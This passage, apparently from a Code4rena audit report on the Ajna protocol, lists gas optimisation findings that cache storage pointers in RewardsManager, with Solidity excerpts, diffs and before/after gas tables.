class=\"mtk12\">stakingEpoch</span><span class=\"mtk1\">     = </span><span class=\"mtk12\">stakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">stakingEpoch</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">411</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">rewardsClaimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">]           += </span><span class=\"mtk12\">nextEpochRewards</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">412</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">isEpochClaimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"156\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 314b476..028e487 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -385,14 +385,16 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 tokenId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 epochToClaim_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal returns (uint256 rewards_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address ajnaPool         = stakes[tokenId_].ajnaPool;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 lastClaimedEpoch = stakes[tokenId_].lastClaimedEpoch;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 stakingEpoch     = stakes[tokenId_].stakingEpoch;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        StakeInfo storage stakeInfo = stakes[tokenId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address ajnaPool         = stakeInfo.ajnaPool;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 lastClaimedEpoch = stakeInfo.lastClaimedEpoch;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 stakingEpoch     = stakeInfo.stakingEpoch;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] memory positionIndexes = positionManager.getPositionIndexesFiltered(tokenId_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // iterate through all burn periods to calculate and claim rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        mapping(uint256 =&gt; bool) storage _isEpochClaimed = isEpochClaimed[tokenId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 epoch = lastClaimedEpoch; epoch &lt; epochToClaim_; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint256 nextEpochRewards = _calculateNextEpochRewards(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -409,7 +411,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // update epoch token claim trackers</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             rewardsClaimed[epoch]           += nextEpochRewards;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            isEpochClaimed[tokenId_][epoch] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            _isEpochClaimed[epoch] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L748-L755\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L748-L755</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L775-L785\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L775-L785</a></p>\n<p><em>Gas Savings for <code>RewardsManager.moveStakedLiquidity</code>, obtained via protocol’s tests: Avg 1373 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>2112272</td>\n</tr>\n<tr>\n<td>After</td>\n<td>2110899</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"cache-storage-pointer-for-bucketexchangeratespool_bucketindex_\" style=\"position:relative;\"><a href=\"#cache-storage-pointer-for-bucketexchangeratespool_bucketindex_\" aria-label=\"cache storage pointer for bucketexchangeratespool_bucketindex_ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache storage pointer for <code>bucketExchangeRates[pool_][bucketIndex_]</code></h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"157\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">748</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">burnExchangeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bucketExchangeRates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bucketIndex_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">burnEpoch_</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">749</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">750</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// update bucket exchange rate at epoch only if it wasn&#39;t previously updated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">751</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">burnExchangeRate</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">752</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">curBucketExchangeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">).</span><span class=\"mtk11\">bucketExchangeRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bucketIndex_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">753</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">754</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// record bucket exchange rate at epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">755</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">bucketExchangeRates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bucketIndex_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">burnEpoch_</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">curBucketExchangeRate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">775</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">burnExchangeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bucketExchangeRates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bucketIndex_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">burnEpoch_</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">776</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">777</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// update bucket exchange rate at epoch only if it wasn&#39;t previously updated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">778</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">burnExchangeRate</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">779</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">curBucketExchangeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">).</span><span class=\"mtk11\">bucketExchangeRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bucketIndex_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">780</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">781</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// record bucket exchange rate at epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">782</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">bucketExchangeRates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bucketIndex_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">burnEpoch_</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">curBucketExchangeRate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">783</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">784</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// retrieve the bucket exchange rate at the previous epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">785</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevBucketExchangeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bucketExchangeRates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bucketIndex_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">burnEpoch_</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"158\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 314b476..8e2250e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -745,14 +745,15 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 bucketIndex_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 burnEpoch_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 burnExchangeRate = bucketExchangeRates[pool_][bucketIndex_][burnEpoch_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        mapping(uint256 =&gt; uint256) storage _bucketExchangeRates = bucketExchangeRates[pool_][bucketIndex_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 burnExchangeRate = _bucketExchangeRates[burnEpoch_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // update bucket exchange rate at epoch only if it wasn&#39;t previously updated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (burnExchangeRate == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint256 curBucketExchangeRate = IPool(pool_).bucketExchangeRate(bucketIndex_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // record bucket exchange rate at epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            bucketExchangeRates[pool_][bucketIndex_][burnEpoch_] = curBucketExchangeRate;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            _bucketExchangeRates[burnEpoch_] = curBucketExchangeRate;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -772,17 +773,18 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 totalBurned_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 interestEarned_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal returns (uint256 rewards_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 burnExchangeRate = bucketExchangeRates[pool_][bucketIndex_][burnEpoch_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        mapping(uint256 =&gt; uint256) storage _bucketExchangeRates = bucketExchangeRates[pool_][bucketIndex_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 burnExchangeRate = _bucketExchangeRates[burnEpoch_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // update bucket exchange rate at epoch only if it wasn&#39;t previously updated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (burnExchangeRate == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint256 curBucketExchangeRate = IPool(pool_).bucketExchangeRate(bucketIndex_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // record bucket exchange rate at epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            bucketExchangeRates[pool_][bucketIndex_][burnEpoch_] = curBucketExchangeRate;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            _bucketExchangeRates[burnEpoch_] = curBucketExchangeRate;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // retrieve the bucket exchange rate at the previous epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            uint256 prevBucketExchangeRate = bucketExchangeRates[pool_][bucketIndex_][burnEpoch_ - 1];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 prevBucketExchangeRate = _bucketExchangeRates[burnEpoch_ - 1];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // skip reward calculation if update at the previous epoch was missed and if exchange rate decreased due to bad debt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // prevents excess rewards from being provided from using a 0 value as an input to the interestFactor calculation below.</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L442-L448\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L442-L448</a></p>\n<p><em>Gas Savings for <code>RewardsManager.claimRewards</code>, obtained via protocol’s tests: Avg 4795 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>393064</td>\n</tr>\n<tr>\n<td>After</td>\n<td>388269</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"cache-storage-pointer-for-bucketexchangeratesajnapool_-and-stakestokenid_\" style=\"position:relative;\"><a href=\"#cache-storage-pointer-for-bucketexchangeratesajnapool_-and-stakestokenid_\" aria-label=\"cache storage pointer for bucketexchangeratesajnapool_ and stakestokenid_ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache storage pointer for <code>bucketExchangeRates[ajnaPool_]</code> and <code>stakes[tokenId_]</code></h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"159\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">442</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">BucketState</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bucketSnapshot</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">snapshot</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bucketIndex</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">443</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">444</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bucketRate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">445</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">epoch_</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">stakingEpoch_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">446</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">447</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// if staked in a previous epoch then use the initial exchange rate of epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">448</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">bucketRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bucketExchangeRates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">ajnaPool_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">bucketIndex</span><span class=\"mtk1\">][</span><span class=\"mtk12\">epoch_</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"160\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 314b476..e416c82 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -437,15 +437,17 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 interestEarned;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // iterate through all buckets and calculate epoch rewards for</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        StakeInfo storage _stakeInfo = stakes[tokenId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        mapping(uint256 =&gt; mapping(uint256 =&gt; uint256)) storage _bucketExchangeRates = bucketExchangeRates[ajnaPool_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; positionIndexes_.length; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             bucketIndex = positionIndexes_[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            BucketState memory bucketSnapshot = stakes[tokenId_].snapshot[bucketIndex];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            BucketState memory bucketSnapshot = _stakeInfo.snapshot[bucketIndex];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint256 bucketRate;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (epoch_ != stakingEpoch_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // if staked in a previous epoch then use the initial exchange rate of epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                bucketRate = bucketExchangeRates[ajnaPool_][bucketIndex][epoch_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                bucketRate = _bucketExchangeRates[bucketIndex][epoch_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // if staked during the epoch then use the bucket rate at the time of staking</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L190-L207\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L190-L207</a></p>\n<p><em>Gas Savings for <code>PositionManager.memorializePositions</code>, obtained via protocol’s tests: Avg 1043 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>1134444</td>\n</tr>\n<tr>\n<td>After</td>\n<td>1133401</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"cache-storage-pointer-for-positionsparams_tokenid\" style=\"position:relative;\"><a href=\"#cache-storage-pointer-for-positionsparams_tokenid\" aria-label=\"cache storage pointer for positionsparams_tokenid permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 